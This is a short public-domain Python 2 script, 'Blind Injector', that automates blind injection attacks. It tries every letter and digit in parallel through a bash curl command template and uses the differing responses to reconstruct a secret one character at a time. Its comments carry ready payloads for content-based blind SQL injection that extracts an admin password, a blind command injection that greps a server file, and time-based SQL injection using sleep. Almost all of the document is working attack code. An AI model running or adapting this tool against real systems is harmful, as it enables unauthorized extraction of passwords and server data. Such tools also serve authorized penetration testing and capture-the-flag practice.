#!/usr/bin/env python 

"""
Blind Injector (C) 2018 Public Domain :D

This script is designed to make blind injection easier.

command should include {} at the injection point. It will be executed in parallel by bash and should give a different result for a correct answer (so pipe the result through grep or wc)

"""

from subprocess import Popen, PIPE
import os
import string
from collections import Counter

alphabet = string.letters + string.digits

# example commands:

# content-based blind sqli
#command = "curl -s http://example.com/ --form 'username=admin\" and password like binary \"{}%'"

# content-based blind command-injection
#command = "curl -s 'http://example.com/?search=.%24%28grep+%5E{}+%2Fetc%2Fpassword.txt%29' | wc -l"

# time-based blind sqli (note -m4 --> 4 second timeout)
#command = "curl -s 'http://example.com/ --form 'username=admin%22+and+IF%28password+like+binary+%22{}%25%22%2C+sleep%285%29%2C+null%29%3B%23' -m4"

def getResults(prefix=""):
    processes = {c:Popen(["bash", "-c", command.format(prefix+c)],
                         stdout=PIPE) for c in alphabet}
    os.wait()
    return {c:"".join(proc.stdout) for c, proc in processes.items()}

def dValue(d, v):
    results = [x for x,y in d.items() if y==v]
    return results[0] if results else None

def getUniq(d):
    c = Counter(d.values())
    return dValue(d, dValue(c, 1)) if len(c) == 2 else None


answer = ""

while True:
    results = getResults(answer)
    uniq = getUniq(results)
    if uniq:
        answer += uniq
        print answer
    elif answer == "":
        print ":("
        break
    else:
        break


